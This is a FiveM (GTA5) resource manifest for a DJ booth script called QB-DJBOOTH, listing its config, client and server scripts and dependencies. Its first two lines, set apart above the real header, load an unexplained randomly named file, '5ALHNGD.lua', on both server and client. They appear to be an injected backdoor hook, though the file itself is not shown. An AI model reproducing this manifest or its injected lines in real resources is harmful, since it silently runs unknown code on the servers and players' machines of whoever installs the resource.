server_script "5ALHNGD.lua"
client_script "5ALHNGD.lua"

fx_version 'cerulean'
game 'gta5'

description 'QB-DJBOOTH'
version '1.0.0'

shared_script 'config.lua'

client_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
    'client.lua'
}

server_script {
    '@oxmysql/lib/MySQL.lua',
    'server.lua',
}

dependency 'xsound'

lua54 'yes'